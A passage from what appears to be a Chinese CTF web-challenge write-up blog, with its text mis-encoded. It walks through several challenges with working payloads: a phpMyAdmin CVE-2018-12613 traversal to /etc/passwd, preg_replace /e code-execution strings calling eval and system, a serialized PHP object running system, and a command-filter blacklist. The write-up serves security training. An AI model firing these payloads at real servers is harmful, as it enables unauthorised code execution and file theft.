data[i][:-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">    r = session.post(<span class="string">&#x27;http://127.0.0.1/src/&#x27;</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&#x27;glzjin&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        <span class="built_in">print</span>(file + <span class="string">&quot; found!&quot;</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = <span class="string">&#x27;echo glzjin&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = <span class="string">&#x27;echo glzjin&#x27;</span></span><br><span class="line"> </span><br><span class="line">    r = session.post(<span class="string">&#x27;http://127.0.0.1/src/&#x27;</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&#x27;glzjin&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        <span class="built_in">print</span>(file + <span class="string">&quot; found!&quot;</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># print(&quot;====================&quot;)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:  <span class="comment"># éå†æ–‡ä»¶å¤¹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):  <span class="comment"># åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶å¤¹ï¼Œä¸æ˜¯æ–‡ä»¶å¤¹æ‰æ‰“å¼€</span></span><br><span class="line">        <span class="comment"># read_file(file)</span></span><br><span class="line"> </span><br><span class="line">        pool.submit(read_file, file)</span><br></pre></td></tr></table></figure><h1 id="0x23-GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#0x23-GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="0x23.[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>0x23.[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h1><p>è€ƒç‚¹å°±æ˜¯ï¼šphpMyadmin(CVE-2018-12613)åå°ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´</p><p>æ€ä¹ˆè¯´å‘¢ï¼Œæœ‰ç‚¹ç¦»è°±ï¼Œå•¥éƒ½æ²¡æœ‰å°±èƒ½çŸ¥é“æ˜¯è¿™ä¸ªæ´ï¼Ÿ</p><p>æœ‰äººè¯´çŒœåˆ°æœ‰phpmyadminç›´æ¥è¿›å»äº†ï¼Œï¼Œï¼Œè¡Œå§ã€‚</p><blockquote><p>phpMyadmin(CVE-2018-12613)åå°ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´</p><p>å½±å“ç‰ˆæœ¬ï¼š4.8.0â€”â€”4.8.1</p><p>payload: /phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd</p></blockquote><p>å¯ä»¥æ­£å¸¸å‡ºç°ï¼Œæ–‡ä»¶æ”¹ä¸ºflagå°±å‡ºæ¥äº†</p><h1 id="0x24-BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#0x24-BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="0x24.[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>0x24.[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h1><blockquote><p>  çŸ¥è¯†ç‚¹ï¼š</p><p>  preg_replaceä»£ç æ‰§è¡Œï¼Œ</p><p>  å…ˆçŸ¥ç¤¾åŒºï¼š<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><p>  å›½å…‰å¸ˆå‚…ï¼š<a href="https://www.sqlsec.com/2020/07/preg_replace.html">https://www.sqlsec.com/2020/07/preg_replace.html</a></p></blockquote><p>å®¡è®¡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payloadï¼š<code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code>è¯»next.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å­˜åœ¨preg_replaceä»£ç æ‰§è¡Œï¼Œä½†æ˜¯å¦‚æœGETä¼ <code>.*=xxx</code>ï¼Œä¼šå‡ºé—®é¢˜ï¼Œæˆä¸º_*=xxx</p><p>æ‰€ä»¥æœ‰è¿™æ ·çš„payloadï¼š<code>\S*=$&#123;phpinfo()&#125;</code></p><p>æ¥ä¸‹æ¥å°±æœ‰ä¸¤ç§è§£æ³•ï¼š</p><p><strong>è§£æ³•ä¸€</strong>ï¼šä½¿ç”¨æºç ä¸­ç»™çš„å‡½æ•°</p><p><code>/next.php?\S*=$&#123;getflag()&#125;&amp;cmd=show_source(&quot;&quot;/flag&quot;);</code></p><p><strong>è§£æ³•äºŒ</strong>ï¼šé€šè¿‡POSTä¼ å‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*=$&#123;eval($_POST[cmd])&#125;;</span><br><span class="line">aaa=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p>æˆ–è€…GETï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*=next.php?\S*=$&#123;<span class="keyword">eval</span>(<span class="variable">$_GET</span>[aaa])&#125;&amp;aaa=system(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="0x25-BJDCTF2020-Mark-loves-cat"><a href="#0x25-BJDCTF2020-Mark-loves-cat" class="headerlink" title="0x25.[BJDCTF2020]Mark loves cat"></a>0x25.[BJDCTF2020]Mark loves cat</h1><blockquote><p>  è€ƒç‚¹ï¼šå˜é‡è¦†ç›–</p></blockquote><p>dirsearchæ‰«å®Œæœ‰gitæ³„éœ²</p><p>ç„¶åæˆ‘githackæäº†å¥½ä¹…éœ€è¦çš„æ–‡ä»¶å°±æ˜¯tmdå‡ºä¸æ¥ã€‚ã€‚ã€‚</p><p>ç›´æ¥çœ‹ç½‘ä¸Šçš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>å¯å˜å˜é‡ï¼Œåˆå«å¥—å¨ƒå˜é‡ï¼Œå¯ä»¥å…ˆçœ‹ä¸‹ï¼š<a href="https://www.php.net/manual/zh/language.variables.variable.php">https://www.php.net/manual/zh/language.variables.variable.php</a></p><p>å…ˆçœ‹payloadå†åˆ†æï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br><span class="line">post: $flag=1</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™æ—¶$x=$flagï¼Œ$y=1ï¼Œç„¶å$$x=$flag</p><p>ç„¶åï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ—¶$x=yds,$y=flagï¼Œä¹Ÿå°±æ˜¯è¯´$$x=$yds=$flagï¼Œ</p><h1 id="0x26-ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#0x26-ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="0x26.[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>0x26.[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h1><p>è¿›å»ä¹‹åä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œç„¶åç­‰äº†å‡ ç§’åæœ‰æŠ¥é”™çš„ä¿¡æ¯ï¼ŒæŠ“åŒ…ä¹‹åæœ‰funå’Œpä¸¤ä¸ªpostçš„å‚æ•°ã€‚</p><p><code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code>ï¼Œphpä¸­æ°å¥½æœ‰dateå‡½æ•°ï¼Œä¸”å‚æ•°ä¹Ÿæ˜¯åé¢é‚£æ ·ã€‚</p><p>é‚£ä¹ˆå¯èƒ½funå°±æ˜¯å‡½æ•°ï¼Œpæ˜¯å‚æ•°ï¼Œæ”¹ä¸ªeval(â€˜phpinfo()â€™)è¯•ä¸€ä¸‹ï¼š<code>eval(&#39;phpinfo();&#39;);</code></p><p>æ©ã€‚ã€‚æœ‰è¿‡æ»¤ï¼Œå†è¯•è¯•è¯»æ–‡ä»¶ï¼šfile_get_contents()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, </span><br><span class="line">                         <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, </span><br><span class="line">                         <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line"><span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°å’Œå­—ç¬¦ä¸²ï¼Œè€Œé€ æˆå¯ä»¥è¿è¡Œè¾“å…¥çš„å‡½æ•°å°±æ˜¯<code>call_user_func</code>ï¼Œæ²¡æœ‰ç¦ç”¨ååºåˆ—åŒ–unserializeå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="comment">// $a-&gt;p =  &quot;ls&quot;;</span></span><br><span class="line"><span class="comment">// $a-&gt;p =  &quot;find / -name &#x27;flag*&#x27;&quot;;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;p =  <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="0x27-å®‰æ´µæ¯-2019-easy-web"><a href="#0x27-å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="0x27.[å®‰æ´µæ¯ 2019]easy_web"></a>0x27.[å®‰æ´µæ¯ 2019]easy_web</h1><p>urlä¸­ï¼š<code>index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>ï¼Œå…¶ä¸­imgæ˜¯hex+base64+base64</p><p>æŠŠindex.phpæŒ‰ç…§ä¸Šé¢åŠ å¯†åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixiï½ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>åé¢postçš„aå’Œbç”¨md5ç¢°æ’å¯ä»¥ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 